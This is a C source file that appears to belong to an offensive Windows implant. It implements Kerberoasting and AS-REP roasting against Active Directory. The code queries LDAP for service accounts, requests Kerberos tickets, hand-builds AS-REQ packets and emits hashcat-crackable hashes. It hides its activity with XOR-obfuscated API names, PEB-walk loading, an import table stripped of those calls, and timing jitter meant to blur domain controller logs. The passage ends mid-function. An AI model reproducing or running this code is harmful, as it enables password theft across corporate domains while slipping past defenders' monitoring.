#include "commands.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include <windows.h>
#include <winternl.h> /* UNICODE_STRING, LSA_STRING */
#include <winldap.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <dsgetdc.h>
#include <lm.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* LSA / Kerberos structures defined manually for MinGW compatibility */

#ifndef _NTSECAPI_MANUAL_KERB
#define _NTSECAPI_MANUAL_KERB

#ifndef STATUS_SUCCESS
typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

/* LSA_STRING — may already be in winternl.h on some MinGW builds */
#ifndef _LSA_STRING_DEFINED
#define _LSA_STRING_DEFINED
typedef struct _LSA_STRING2
{
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} LSA_STRING, *PLSA_STRING;
#endif

typedef enum _KERB_PROTOCOL_MESSAGE_TYPE
{
    KerbRetrieveEncodedTicketMessage = 4,
} KERB_PROTOCOL_MESSAGE_TYPE;

#define KERB_RETRIEVE_TICKET_DONT_USE_CACHE 0x00000001
#define KERB_RETRIEVE_TICKET_USE_CACHE_ONLY 0x00000002

#define KERB_ETYPE_RC4_HMAC_NT 23
#define KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 18

typedef struct _KERB_RETRIEVE_TKT_REQUEST
{
    KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    LUID LogonId;
    UNICODE_STRING TargetName;
    ULONG TicketFlags;
    ULONG CacheOptions;
    LONG EncryptionType;
    HANDLE CredentialsHandle;
} KERB_RETRIEVE_TKT_REQUEST, *PKERB_RETRIEVE_TKT_REQUEST;

typedef struct _KERB_EXTERNAL_NAME
{
    SHORT NameType;
    USHORT NameCount;
    UNICODE_STRING Names[1];
} KERB_EXTERNAL_NAME, *PKERB_EXTERNAL_NAME;

typedef struct _KERB_CRYPTO_KEY
{
    LONG KeyType;
    ULONG Length;
    PUCHAR Value;
} KERB_CRYPTO_KEY, *PKERB_CRYPTO_KEY;

typedef struct _KERB_EXTERNAL_TICKET
{
    PKERB_EXTERNAL_NAME ServiceName;
    PKERB_EXTERNAL_NAME TargetName;
    PKERB_EXTERNAL_NAME ClientName;
    UNICODE_STRING DomainName;
    UNICODE_STRING TargetDomainName;
    UNICODE_STRING AltTargetDomainName;
    KERB_CRYPTO_KEY SessionKey;
    ULONG TicketFlags;
    ULONG Flags;
    LARGE_INTEGER KeyExpirationTime;
    LARGE_INTEGER StartTime;
    LARGE_INTEGER EndTime;
    LARGE_INTEGER RenewUntil;
    LARGE_INTEGER TimeSkew;
    ULONG EncodedTicketSize;
    PUCHAR EncodedTicket;
} KERB_EXTERNAL_TICKET, *PKERB_EXTERNAL_TICKET;

typedef struct _KERB_RETRIEVE_TKT_RESPONSE
{
    KERB_EXTERNAL_TICKET Ticket;
} KERB_RETRIEVE_TKT_RESPONSE, *PKERB_RETRIEVE_TKT_RESPONSE;

#endif /* _NTSECAPI_MANUAL_KERB */

/* LSA function pointers (secur32.dll — already linked) */
typedef NTSTATUS(WINAPI *pLsaConnectUntrusted_t)(PHANDLE);
typedef NTSTATUS(WINAPI *pLsaLookupAuthPackage_t)(HANDLE, PLSA_STRING, PULONG);
typedef NTSTATUS(WINAPI *pLsaCallAuthPackage_t)(HANDLE, ULONG, PVOID, ULONG,
                                                PVOID *, PULONG, PNTSTATUS);
typedef NTSTATUS(WINAPI *pLsaFreeReturnBuffer_t)(PVOID);

static pLsaConnectUntrusted_t fn_LsaConn;
static pLsaLookupAuthPackage_t fn_LsaLookup;
static pLsaCallAuthPackage_t fn_LsaCall;
static pLsaFreeReturnBuffer_t fn_LsaFree;

/* GetComputerNameExW — removes from IAT */
typedef BOOL(WINAPI *_KCNX_t)(COMPUTER_NAME_FORMAT, LPWSTR, LPDWORD);
static BOOL _kcnexw(COMPUTER_NAME_FORMAT fmt, LPWSTR buf, LPDWORD sz)
{
    static _KCNX_t fn = NULL;
    if (!fn)
    {
        char fs[22], ks[14];
        volatile unsigned char xk = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_GetComputerNameExW); i++)
            fs[i] = (char)(EVS_fn_GetComputerNameExW[i] ^ xk);
        fs[sizeof(EVS_fn_GetComputerNameExW)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_kernel32); i++)
            ks[i] = (char)(EVS_dll_kernel32[i] ^ xk);
        ks[sizeof(EVS_dll_kernel32)] = '\0';
        HMODULE m = _peb_module(ks);
        SecureZeroMemory(ks, sizeof(ks));
        if (m)
            fn = (_KCNX_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    return fn ? fn(fmt, buf, sz) : FALSE;
}

static int lsa_init(void)
{
    char s[32];
    volatile unsigned char _k = EVS_KEY;

    for (int i = 0; i < (int)sizeof(EVS_dll_secur32); i++)
        s[i] = (char)(EVS_dll_secur32[i] ^ _k);
    s[sizeof(EVS_dll_secur32)] = '\0';
    HMODULE h = _peb_module(s);
    if (!h)
        h = LoadLibraryA(s);
    SecureZeroMemory(s, sizeof(s));
    if (!h)
        return -1;

    for (int i = 0; i < (int)sizeof(EVS_fn_LsaConnectUntrusted); i++)
        s[i] = (char)(EVS_fn_LsaConnectUntrusted[i] ^ _k);
    s[sizeof(EVS_fn_LsaConnectUntrusted)] = '\0';
    fn_LsaConn = (pLsaConnectUntrusted_t)GetProcAddress(h, s);
    SecureZeroMemory(s, sizeof(s));

    for (int i = 0; i < (int)sizeof(EVS_fn_LsaLookupAuthenticationPackage); i++)
        s[i] = (char)(EVS_fn_LsaLookupAuthenticationPackage[i] ^ _k);
    s[sizeof(EVS_fn_LsaLookupAuthenticationPackage)] = '\0';
    fn_LsaLookup = (pLsaLookupAuthPackage_t)GetProcAddress(h, s);
    SecureZeroMemory(s, sizeof(s));

    for (int i = 0; i < (int)sizeof(EVS_fn_LsaCallAuthenticationPackage); i++)
        s[i] = (char)(EVS_fn_LsaCallAuthenticationPackage[i] ^ _k);
    s[sizeof(EVS_fn_LsaCallAuthenticationPackage)] = '\0';
    fn_LsaCall = (pLsaCallAuthPackage_t)GetProcAddress(h, s);
    SecureZeroMemory(s, sizeof(s));

    for (int i = 0; i < (int)sizeof(EVS_fn_LsaFreeReturnBuffer); i++)
        s[i] = (char)(EVS_fn_LsaFreeReturnBuffer[i] ^ _k);
    s[sizeof(EVS_fn_LsaFreeReturnBuffer)] = '\0';
    fn_LsaFree = (pLsaFreeReturnBuffer_t)GetProcAddress(h, s);
    SecureZeroMemory(s, sizeof(s));

    return (fn_LsaConn && fn_LsaLookup && fn_LsaCall && fn_LsaFree) ? 0 : -1;
}

/* ── DER parser (ticket enc-part extraction) ─────────────────────────────── */

static int der_read_len(const uint8_t *buf, size_t total, size_t *off, size_t *out_len)
{
    if (*off >= total)
        return -1;
    uint8_t b = buf[(*off)++];
    if (!(b & 0x80))
    {
        *out_len = b;
        return 0;
    }
    int nb = b & 0x7f;
    if (nb == 0 || nb > 4 || *off + nb > total)
        return -1;
    *out_len = 0;
    for (int i = 0; i < nb; i++)
        *out_len = (*out_len << 8) | buf[(*off)++];
    return 0;
}

/* Advance past one TLV; return pointer to value and its length */
static int der_next(const uint8_t *buf, size_t total, size_t *off,
                    uint8_t *tag_out, const uint8_t **val, size_t *vlen)
{
    if (*off >= total)
        return -1;
    *tag_out = buf[(*off)++];
    size_t l;
    if (der_read_len(buf, total, off, &l))
        return -1;
    if (*off + l > total)
        return -1;
    *val = buf + *off;
    *vlen = l;
    *off += l;
    return 0;
}

/* Find first child TLV with given tag inside a buffer */
static const uint8_t *der_find(const uint8_t *buf, size_t len, uint8_t tag, size_t *found_len)
{
    size_t off = 0;
    uint8_t t;
    const uint8_t *v;
    size_t vl;
    while (der_next(buf, len, &off, &t, &v, &vl) == 0)
        if (t == tag)
        {
            *found_len = vl;
            return v;
        }
    return NULL;
}

/*
 * Extract EncryptedData cipher bytes from a raw Kerberos Ticket DER blob.
 * Returns pointer into ticket_der buffer; *cipher_len set on success.
 * NULL on failure.
 *
 * Ticket DER layout:
 *   0x61 [APPLICATION 1]
 *     0x30 SEQUENCE
 *       0xa0 [0] tkt-vno
 *       0xa1 [1] realm
 *       0xa2 [2] sname
 *       0xa3 [3] enc-part EncryptedData
 *         0x30 SEQUENCE
 *           0xa0 [0] etype INTEGER
 *           0xa1 [1] kvno INTEGER (optional)
 *           0xa2 [2] cipher OCTET STRING   <── we want this
 */
static const uint8_t *ticket_cipher(const uint8_t *ticket_der, size_t ticket_len,
                                    size_t *cipher_len)
{
    size_t off = 0;
    uint8_t tag;
    const uint8_t *v;
    size_t vl;

    /* 0x61 APPLICATION 1 */
    if (der_next(ticket_der, ticket_len, &off, &tag, &v, &vl) || tag != 0x61)
        return NULL;
    /* 0x30 SEQUENCE */
    const uint8_t *seq;
    size_t seq_len;
    seq = der_find(v, vl, 0x30, &seq_len);
    if (!seq)
        return NULL;
    /* [3] enc-part */
    const uint8_t *enc;
    size_t enc_len;
    enc = der_find(seq, seq_len, 0xa3, &enc_len);
    if (!enc)
        return NULL;
    /* SEQUENCE inside enc-part */
    const uint8_t *eseq;
    size_t eseq_len;
    eseq = der_find(enc, enc_len, 0x30, &eseq_len);
    if (!eseq)
        return NULL;
    /* [2] cipher OCTET STRING */
    const uint8_t *ctx2;
    size_t ctx2_len;
    ctx2 = der_find(eseq, eseq_len, 0xa2, &ctx2_len);
    if (!ctx2)
        return NULL;
    const uint8_t *ostr;
    size_t ostr_len;
    ostr = der_find(ctx2, ctx2_len, 0x04, &ostr_len);
    if (!ostr || ostr_len < 17)
        return NULL;
    *cipher_len = ostr_len;
    return ostr;
}

/* ── LDAP helpers ──────────────────────────────────────────────────────────── */

/* Get defaultNamingContext from rootDSE */
static char *ldap_get_base_dn(LDAP *ld)
{
    LDAPMessage *res = NULL;
    char *attrs[] = {"defaultNamingContext", NULL};
    if (ldap_search_s(ld, "", LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res) != LDAP_SUCCESS)
        return NULL;
    LDAPMessage *e = ldap_first_entry(ld, res);
    if (!e)
    {
        ldap_msgfree(res);
        return NULL;
    }
    char **vals = ldap_get_values(ld, e, "defaultNamingContext");
    char *dn = (vals && vals[0]) ? _strdup(vals[0]) : NULL;
    if (vals)
        ldap_value_free(vals);
    ldap_msgfree(res);
    return dn;
}

/* ── Hex encoding ─────────────────────────────────────────────────────────── */

static void hex_append(char *buf, size_t bufsz, size_t *pos,
                       const uint8_t *data, size_t len)
{
    for (size_t i = 0; i < len && *pos + 2 < bufsz; i++)
    {
        *pos += snprintf(buf + *pos, bufsz - *pos, "%02x", data[i]);
    }
}

/* ── Random jitter (OPSEC: space out TGS/AS-REQ events) ─────────────────── */

static void opsec_jitter(void)
{
    DWORD ms = 40 + (DWORD)(rand() % 80); /* 40–120 ms */
    Sleep(ms);
}

/* ── Kerberoasting ──────────────────────────────────────────────────────── */

int cmd_kerberoast(const char *args, char *output_buf, size_t output_size)
{
    int etype = KERB_ETYPE_RC4_HMAC_NT;
    if (args && strstr(args, "aes"))
        etype = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;

    if (lsa_init() != 0)
        return snprintf(output_buf, output_size, "[-] secur32 load failed\n"), -1;

    /* Connect to LSA */
    HANDLE hLsa = NULL;
    if (fn_LsaConn(&hLsa) != STATUS_SUCCESS)
        return snprintf(output_buf, output_size, "[-] lsa connect failed\n"), -1;

    LSA_STRING pkg = {8, 9, "Kerberos"};
    ULONG pkg_id = 0;
    if (fn_LsaLookup(hLsa, &pkg, &pkg_id) != STATUS_SUCCESS)
    {
        CloseHandle(hLsa);
        return snprintf(output_buf, output_size, "[-] lsa lookup failed\n"), -1;
    }

    /* LDAP: connect + bind with current token */
    LDAP *ld = ldap_init(NULL, LDAP_PORT);
    if (!ld)
    {
        CloseHandle(hLsa);
        return snprintf(output_buf, output_size, "[-] ldap_init failed\n"), -1;
    }

    ULONG ldap_ver = LDAP_VERSION3;
    ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &ldap_ver);

    if (ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS)
    {
        ldap_unbind(ld);
        CloseHandle(hLsa);
        return snprintf(output_buf, output_size, "[-] ldap_bind failed (not domain joined?)\n"), -1;
    }

    char *base_dn = ldap_get_base_dn(ld);
    if (!base_dn)
    {
        ldap_unbind(ld);
        CloseHandle(hLsa);
        return snprintf(output_buf, output_size, "[-] rootDSE query failed\n"), -1;
    }

    /* Find domain FQDN (= Kerberos realm, uppercase) */
    char realm[256] = {0};
    {
        WCHAR dom[256] = {0};
        DWORD dlen = 256;
        _kcnexw(ComputerNameDnsDomain, dom, &dlen);
        WideCharToMultiByte(CP_ACP, 0, dom, -1, realm, sizeof(realm) - 1, NULL, NULL);
        for (char *p = realm; *p; p++)
            *p = (char)toupper((unsigned char)*p);
    }

    /* LDAP search: users with SPN, exclude krbtgt and machine accounts */
    char *attrs[] = {"sAMAccountName", "servicePrincipalName", NULL};
    char *filter = "(&(objectCategory=user)(servicePrincipalName=*)"
                   "(!samAccountName=krbtgt)(!userAccountControl:1.2.840.113556.1.4.803:=2))";

    LDAPMessage *res = NULL;
    if (ldap_search_s(ld, base_dn, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &res) != LDAP_SUCCESS)
    {
        free(base_dn);
        ldap_unbind(ld);
        CloseHandle(hLsa);
        return snprintf(output_buf, output_size, "[-] LDAP search failed\n"), -1;
    }
    free(base_dn);

    size_t pos = 0;
    int found = 0;
    int err_count = 0;

    for (LDAPMessage *e = ldap_first_entry(ld, res); e; e = ldap_next_entry(ld, e))
    {
        char **sam = ldap_get_values(ld, e, "sAMAccountName");
        char **spns = ldap_get_values(ld, e, "servicePrincipalName");
        if (!sam || !sam[0] || !spns || !spns[0])
        {
            if (sam)
                ldap_value_free(sam);
            if (spns)
                ldap_value_free(spns);
            continue;
        }

        /* Request TGS for each SPN on this account */
        for (int si = 0; spns[si]; si++)
        {
            /* Convert SPN to wide */
            int wlen = MultiByteToWideChar(CP_ACP, 0, spns[si], -1, NULL, 0);
            WCHAR *spn_w = (WCHAR *)malloc((size_t)wlen * sizeof(WCHAR));
            if (!spn_w)
                continue;
            MultiByteToWideChar(CP_ACP, 0, spns[si], -1, spn_w, wlen);

            /* Build LSA request */
            size_t spn_bytes = (size_t)(wlen - 1) * sizeof(WCHAR);
            size_t req_sz = sizeof(KERB_RETRIEVE_TKT_REQUEST) + spn_bytes + sizeof(WCHAR);
            KERB_RETRIEVE_TKT_REQUEST *req = (KERB_RETRIEVE_TKT_REQUEST *)calloc(1, req_sz);
            if (!req)
            {
                free(spn_w);
                continue;
            }

            req->MessageType = KerbRetrieveEncodedTicketMessage;
            req->CacheOptions = KERB_RETRIEVE_TICKET_DONT_USE_CACHE; /* force new TGS-REQ to DC */
            req->EncryptionType = etype;
            req->TargetName.Buffer = (PWSTR)(req + 1);
            req->TargetName.Length = (USHORT)spn_bytes;
            req->TargetName.MaximumLength = (USHORT)(spn_bytes + sizeof(WCHAR));
            memcpy(req->TargetName.Buffer, spn_w, spn_bytes);
            free(spn_w);

            PKERB_RETRIEVE_TKT_RESPONSE resp = NULL;
            ULONG resp_sz = 0;
            NTSTATUS sub = 0;
            NTSTATUS st = fn_LsaCall(hLsa, pkg_id, req, (ULONG)req_sz,
                                     (PVOID *)&resp, &resp_sz, &sub);
            free(req);

            if (st != STATUS_SUCCESS || !resp)
            {
                err_count++;
                continue;
            }

            PKERB_EXTERNAL_TICKET tkt = &resp->Ticket;
            if (!tkt->EncodedTicket || tkt->EncodedTicketSize == 0)
            {
                fn_LsaFree(resp);
                err_count++;
                continue;
            }

            /* Parse DER ticket → cipher bytes */
            size_t cipher_len = 0;
            const uint8_t *cipher = ticket_cipher(tkt->EncodedTicket,
                                                  tkt->EncodedTicketSize,
                                                  &cipher_len);
            if (!cipher || cipher_len < 17)
            {
                fn_LsaFree(resp);
                err_count++;
                continue;
            }

            /* Emit hashcat line: $krb5tgs$<etype>$*<user>$<realm>$<spn>*$<c16>$<rest> */
            int n;
            {
                char _kt[10];
                _kt[0] = '$';
                _kt[1] = 'k';
                _kt[2] = 'r';
                _kt[3] = 'b';
                _kt[4] = '5';
                _kt[5] = 't';
                _kt[6] = 'g';
                _kt[7] = 's';
                _kt[8] = '$';
                _kt[9] = '\0';
                n = snprintf(output_buf + pos, output_size - pos,
                             "%s%d$*%s$%s$%s*$", _kt, etype, sam[0], realm, spns[si]);
            }
            pos += (n > 0) ? (size_t)n : 0;

            hex_append(output_buf, output_size, &pos, cipher, 16);
            if (pos < output_size - 1)
                output_buf[pos++] = '$';
            hex_append(output_buf, output_size, &pos, cipher + 16, cipher_len - 16);
            if (pos < output_size - 1)
                output_buf[pos++] = '\n';

            fn_LsaFree(resp);
            found++;
            opsec_jitter(); /* OPSEC: space out 4769 events */
        }

        ldap_value_free(sam);
        ldap_value_free(spns);
    }

    ldap_msgfree(res);
    ldap_unbind(ld);
    CloseHandle(hLsa);

    if (found == 0 && pos == 0)
    {
        pos += snprintf(output_buf + pos, output_size - pos,
                        "[*] no roastable accounts (errors: %d)\n", err_count);
    }
    else if (err_count > 0)
    {
        pos += snprintf(output_buf + pos, output_size - pos,
                        "[*] %d accounts roasted, %d errors\n", found, err_count);
    }

    if (pos < output_size)
        output_buf[pos] = '\0';
    return (int)pos;
}

/* ── AS-REP roasting ─────────────────────────────────────────────────────── */

/* Minimal DER builder — bottom-up into dynamic buffer */

typedef struct
{
    uint8_t *d;
    size_t cap;
    size_t len;
} derbuf_t;

static void db_grow(derbuf_t *b, size_t extra)
{
    if (b->len + extra > b->cap)
    {
        b->cap = b->len + extra + 128;
        uint8_t *tmp = (uint8_t *)realloc(b->d, b->cap);
        if (!tmp)
        {
            free(b->d);
            b->d = NULL;
            b->len = 0;
            b->cap = 0;
            return;
        }
        b->d = tmp;
    }
}
static void db_push(derbuf_t *b, const uint8_t *data, size_t n)
{
    db_grow(b, n);
    if (!b->d)
        return;
    memcpy(b->d + b->len, data, n);
    b->len += n;
}

/* Insert length prefix + tag before offset 'start' */
static void db_wrap(derbuf_t *b, size_t start, uint8_t tag)
{
    size_t inner = b->len - start;
    uint8_t lbuf[4];
    int llen;
    if (inner < 0x80)
    {
        lbuf[0] = (uint8_t)inner;
        llen = 1;
    }
    else if (inner < 0x100)
    {
        lbuf[0] = 0x81;
        lbuf[1] = (uint8_t)inner;
        llen = 2;
    }
    else
    {
        lbuf[0] = 0x82;
        lbuf[1] = (uint8_t)(inner >> 8);
        lbuf[2] = (uint8_t)inner;
        llen = 3;
    }
    db_grow(b, 1 + llen);
    memmove(b->d + start + 1 + llen, b->d + start, inner);
    b->d[start] = tag;
    memcpy(b->d + start + 1, lbuf, llen);
    b->len += 1 + llen;
}

/* Encode DER INTEGER (positive, minimal) */
static void db_integer(derbuf_t *b, uint32_t val)
{
    uint8_t tmp[5];
    int n = 0;
    if (val == 0)
    {
        tmp[n++] = 0;
    }
    else
    {
        uint32_t v = val;
        uint8_t bytes[4];
        int nb = 0;
        while (v)
        {
            bytes[nb++] = (uint8_t)(v & 0xff);
            v >>= 8;
        }
        /* big-endian, ensure no sign confusion */
        for (int i = nb - 1; i >= 0; i--)
            tmp[n++] = bytes[i];
        if (tmp[0] & 0x80)
        {
            memmove(tmp + 1, tmp, n);
            tmp[0] = 0;
            n++;
        } /* prepend 0x00 */
    }
    size_t s = b->len;
    db_push(b, tmp, n);
    db_wrap(b, s, 0x02); /* INTEGER */
}

/* Encode DER GeneralString */
static void db_genstr(derbuf_t *b, const char *s)
{
    size_t start = b->len;
    db_push(b, (const uint8_t *)s, strlen(s));
    db_wrap(b, start, 0x1b); /* GeneralString */
}

/* Encode DER GeneralizedTime (KerberosTime) */
static void db_ktime(derbuf_t *b, const char *ts)
{
    size_t start = b->len;
    db_push(b, (const uint8_t *)ts, strlen(ts));
    db_wrap(b, start, 0x18); /* GeneralizedTime */
}

/*
 * Build a minimal Kerberos AS-REQ DER blob (no pre-auth) for a given
 * username + realm + etype.  Returns malloc'd buffer, caller free()s.
 * Sets *out_len on success.
 */
static uint8_t *build_asreq(const char *username, const char *realm,
                            int etype, uint32_t nonce, size_t *out_len)
{
    derbuf_t b = {0};

    /* ── req-body ────────────────────────────────────────────────────────── */
    size_t rb_start = b.len;
    {
        /* kdc-options [0] BIT STRING: forwardable(1) | renewable-ok(27)
           = 0x40000010 in MSB-first 32-bit field.
           BIT STRING: 03 05 00 40 00 00 10 */
        size_t s = b.len;
        uint8_t ks[] = {0x03, 0x05, 0x00, 0x40, 0x00, 0x00, 0x10};
        db_push(&b, ks, sizeof(ks));
        db_wrap(&b, s, 0xa0); /* [0] */

        /* cname [1] PrincipalName */
        {
            size_t cn = b.len;
            {
                size_t pn = b.len;
                /* name-type [0] INTEGER 1 (NT-PRINCIPAL) */
                {
                    size_t ss = b.len;
                    db_integer(&b, 1);
                    db_wrap(&b, ss, 0xa0);
                }
                /* name-string [1] SEQUENCE OF GeneralString { username } */
                {
                    size_t ns = b.len;
                    {
                        size_t ss = b.len;
                        db_genstr(&b, username);
                        size_t ss2 = b.len;
                        (void)ss2;
                        db_wrap(&b, ss, 0x30);
                    }
                    db_wrap(&b, ns, 0xa1);
                }
                db_wrap(&b, pn, 0x30); /* PrincipalName SEQUENCE */
            }
            db_wrap(&b, cn, 0xa1); /* [1] */
        }

        /* realm [2] GeneralString */
        {
            size_t s2 = b.len;
            db_genstr(&b, realm);
            db_wrap(&b, s2, 0xa2);
        }

        /* sname [3] PrincipalName { NT-SRV-INST=2, "krbtgt", realm } */
        {
            size_t sn = b.len;
            {
                size_t pn = b.len;
                {
                    size_t ss = b.len;
                    db_integer(&b, 2);
                    db_wrap(&b, ss, 0xa0);
                }
                {
                    size_t ns = b.len;
                    {
                        size_t ss = b.len;
                        db_genstr(&b, "krbtgt");
                        db_wrap(&b, ss, 0x30);
                    }
                    {
                        size_t ss = b.len;
                        db_genstr(&b, realm);
                        db_wrap(&b, ss, 0x30);
                    }
                    /* Both strings in one SEQUENCE OF */
                    size_t inner = b.len - ns;
                    uint8_t *tmp = (uint8_t *)malloc(inner > 0 ? inner : 1);
                    if (!tmp)
                    {
                        free(b.d);
                        return NULL;
                    }
                    memcpy(tmp, b.d + ns, inner);
                    b.len = ns;
                    size_t sq = b.len;
                    db_push(&b, tmp, inner);
                    free(tmp);
                    db_wrap(&b, sq, 0x30);
                    db_wrap(&b, ns, 0xa1);
                }
                db_wrap(&b, pn, 0x30);
            }
            db_wrap(&b, sn, 0xa3); /* [3] */
        }

        /* till [5] "99991231235959Z" */
        {
            size_t s2 = b.len;
            db_ktime(&b, "99991231235959Z");
            db_wrap(&b, s2, 0xa5);
        }

        /* nonce [7] */
        {
            size_t s2 = b.len;
            db_integer(&b, nonce);
            db_wrap(&b, s2, 0xa7);
        }

        /* etype [8] SEQUENCE OF INTEGER */
        {
            size_t et = b.len;
            {
                size_t ss = b.len;
                db_integer(&b, (uint32_t)etype);
                db_wrap(&b, ss, 0x30);
            }
            db_wrap(&b, et, 0xa8);
        }

        db_wrap(&b, rb_start, 0x30); /* KDC-REQ-BODY SEQUENCE */
    }
    db_wrap(&b, rb_start, 0xa4); /* req-body [4] */

    /* ── msg-type [2] INTEGER 10, pvno [1] INTEGER 5 ─ prepend ── */
    /* Prepend in reverse order so they appear first */
    {
        derbuf_t front = {0};
        {
            size_t s = front.len;
            db_integer(&front, 5);
            db_wrap(&front, s, 0xa1);
        }
        {
            size_t s = front.len;
            db_integer(&front, 10);
            db_wrap(&front, s, 0xa2);
        }
        db_grow(&b, front.len);
        memmove(b.d + front.len, b.d, b.len);
        memcpy(b.d, front.d, front.len);
        b.len += front.len;
        free(front.d);
    }

    /* ── Wrap: SEQUENCE then APPLICATION 10 ── */
    db_wrap(&b, 0, 0x30); /* KDC-REQ SEQUENCE */
    db_wrap(&b, 0, 0x6a); /* APPLICATION 10 */

    *out_len = b.len;
    return b.d;
}

/* Parse AS-REP: extract enc-part cipher for hashcat format
 * AS-REP DER: [APPLICATION 11] 0x6b
 *   SEQUENCE
 *     [0] pvno
 *     [1] msg-type
 *     [2] padata (optional)
 *     [3] crealm
 *     [4] cname
 *     [5] ticket
 *     [6] enc-part EncryptedData   <── we want this
 */
static const uint8_t *asrep_cipher(const uint8_t *buf, size_t len, size_t *cipher_len)
{
    size_t off = 0;
    uint8_t tag;
    const uint8_t *v;
    size_t vl;

    /* APPLICATION 11 */
    if (der_next(buf, len, &off, &tag, &v, &vl) || tag != 0x6b)
        return NULL;

    /* Find SEQUENCE wrapper */
    const uint8_t *seq;
    size_t seq_len;
    seq = der_find(v, vl, 0x30, &seq_len);
    if (!seq)
        return NULL;

    /* [6] enc-part */
    const uint8_t *enc;
    size_t enc_len;
    enc = der_find(seq, seq_len, 0xa6, &enc_len);
    if (!enc)
        return NULL;

    /* EncryptedData SEQUENCE */
    const uint8_t *eseq;
    size_t eseq_len;
    eseq = der_find(enc, enc_len, 0x30, &eseq_len);
    if (!eseq)
        return NULL;

    /* [2] cipher OCTET STRING */
    const uint8_t *ctx2;
    size_t ctx2_len;
    ctx2 = der_find(eseq, eseq_len, 0xa2, &ctx2_len);
    if (!ctx2)
        return NULL;

    const uint8_t *ostr;
    size_t ostr_len;
    ostr = der_find(ctx2, ctx2_len, 0x04, &ostr_len);
    if (!ostr || ostr_len < 17)
        return NULL;

    *cipher_len = ostr_len;
    return ostr;
}

/* Send AS-REQ to KDC:88 via TCP, return malloc'd response. *resp_len set. */
static uint8_t *send_asreq(const char *dc_host, const uint8_t *asreq, size_t asreq_len,
                           size_t *resp_len)
{
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    struct addrinfo hints = {0}, *ai = NULL;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_UNSPEC;
    if (getaddrinfo(dc_host, "88", &hints, &ai) != 0)
        return NULL;

    SOCKET s = socket(ai->ai_family, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET)
    {
        freeaddrinfo(ai);
        return NULL;
    }

    /* 5-second connect timeout */
    DWORD timeout = 5000;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

    if (connect(s, ai->ai_addr, (int)ai->ai_addrlen) != 0)
    {
        freeaddrinfo(ai);
        closesocket(s);
        return NULL;
    }
    freeaddrinfo(ai);

    /* TCP Kerberos framing: 4-byte BE length prefix */
    uint8_t len_hdr[4];
    len_hdr[0] = (uint8_t)(asreq_len >> 24);
    len_hdr[1] = (uint8_t)(asreq_len >> 16);
    len_hdr[2] = (uint8_t)(asreq_len >> 8);
    len_hdr[3] = (uint8_t)(asreq_len);

    if (send(s, (char *)len_hdr, 4, 0) != 4 ||
        send(s, (char *)asreq, (int)asreq_len, 0) != (int)asreq_len)
    {
        closesocket(s);
        return NULL;
    }

    /* Read 4-byte response length */
    uint8_t rlen_buf[4] = {0};
    int nr = recv(s, (char *)rlen_buf, 4, MSG_WAITALL);
    if (nr != 4)
    {
        closesocket(s);
        return NULL;
    }
    size_t rlen = ((size_t)rlen_buf[0] << 24) | ((size_t)rlen_buf[1] << 16) |
                  ((size_t)rlen_buf[2] << 8) | (size_t)rlen_buf[3];

    if (rlen == 0 || rlen > 65536)
    {
        closesocket(s);
        return NULL;
    }

    uint8_t *resp = (uint8_t *)malloc(rlen);
    if (!resp)
    {
        closesocket(s);
        return NULL;
    }

    size_t got = 0;
    while (got < rlen)
    {
        int n = recv(s, (char *)resp + got, (int)(rlen - got), 0);
        if (n <= 0)
            break;
        got += n;
    }
    closesocket(s);

    if (got != rlen)
    {
        free(resp);
        return NULL;
    }
    *resp_len = rlen;
    return resp;
}

int cmd_asreproast(const char *args, char *output_buf, size_t output_size)
{
    (void)args;

    /* Get domain FQDN (= realm) */
    char realm[256] = {0};
    {
        WCHAR dom[256] = {0};
        DWORD dlen = 256;
        _kcnexw(ComputerNameDnsDomain, dom, &dlen);
        WideCharToMultiByte(CP_ACP, 0, dom, -1, realm, sizeof(realm) - 1, NULL, NULL);
        for (char *p = realm; *p; p++)
            *p = (char)toupper((unsigned char)*p);
    }

    /* Get DC hostname — DsGetDcNameW loaded dynamically (removes NETAPI32 IAT entry) */
    char dc_host[512] = {0};
    {
        typedef DWORD(WINAPI * DsGDCN_t)(LPCWSTR, LPCWSTR, GUID *, LPCWSTR, ULONG, DOMAIN_CONTROLLER_INFOW **);
        static DsGDCN_t _fn = NULL;
        if (!_fn)
        {
            char fs[16], ds[16];
            volatile unsigned char _k = EVS_KEY;
            for (int _i = 0; _i < (int)sizeof(EVS_fn_DsGetDcNameW); _i++)
                fs[_i] = (char)(EVS_fn_DsGetDcNameW[_i] ^ _k);
            fs[sizeof(EVS_fn_DsGetDcNameW)] = '\0';
            for (int _i = 0; _i < (int)sizeof(EVS_dll_netapi32); _i++)
                ds[_i] = (char)(EVS_dll_netapi32[_i] ^ _k);
            ds[sizeof(EVS_dll_netapi32)] = '\0';
            HMODULE _h = LoadLibraryA(ds);
            SecureZeroMemory(ds, sizeof(ds));
            if (_h)
                _fn = (DsGDCN_t)(void *)GetProcAddress(_h, fs);
            SecureZeroMemory(fs, sizeof(fs));
        }
        DOMAIN_CONTROLLER_INFOW *dci = NULL;
        if (_fn && _fn(NULL, NULL, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED, &dci) == NO_ERROR && dci && dci->DomainControllerName)
        {
